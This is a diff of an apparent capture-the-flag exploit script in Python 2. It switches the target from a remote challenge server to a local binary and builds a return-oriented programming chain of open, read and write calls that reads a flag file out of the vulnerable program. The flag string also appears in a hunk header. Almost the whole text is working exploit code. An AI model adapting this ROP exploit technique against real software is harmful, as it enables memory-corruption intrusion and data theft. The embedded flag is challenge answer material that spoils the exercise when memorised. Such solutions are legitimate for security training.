@@ -4,8 +4,8 @@ HS{1_Ha73_F1na1_4xam}
 import pwnbox,struct
 pack = lambda x: struct.pack("<I",x)
 unpack = lambda x: struct.unpack("<I",x)[0]
-#p = pwnbox.pipe.ProcessPipe("/home/holy/review")
-p = pwnbox.pipe.SocketPipe("1.224.175.28", 10040)
+p = pwnbox.pipe.ProcessPipe("/home/holy/review")
+#p = pwnbox.pipe.SocketPipe("1.224.175.28", 10040)
 MAIN = 0x08048F74
 def end():
   p.read_until(">>>")
@@ -53,13 +53,13 @@ heap = unpack(call(0x08050910,MAIN,0x080edf20)[:4])
 print hex(heap)
 buf = heap-0x40
 
-#max 0x50
 open_adr = 0x0806e250
 pppr = 0x0804841d
 flag = heap-4
 read_adr = 0x806E2C0
 write_adr = 0x0806e330
 flag_adr = 0x080EE340
+
 #open
 rop =  pack(open_adr)
 rop += pack(pppr)
@@ -67,20 +67,20 @@ rop += pack(flag)
 rop += pack(0)
 rop += pack(0)
 
+#read
 rop += pack(read_adr)
 rop += pack(pppr)
 rop += pack(3)
 rop += pack(flag_adr)
 rop += pack(0x100)
 
+#write
 rop += pack(write_adr)
 rop += pack(pppr)
 rop += pack(1)
 rop += pack(flag_adr)
 rop += pack(0x100)
 
-#read
-#write
 
 pay = "B"*14
 pay += pack(0x8048419)
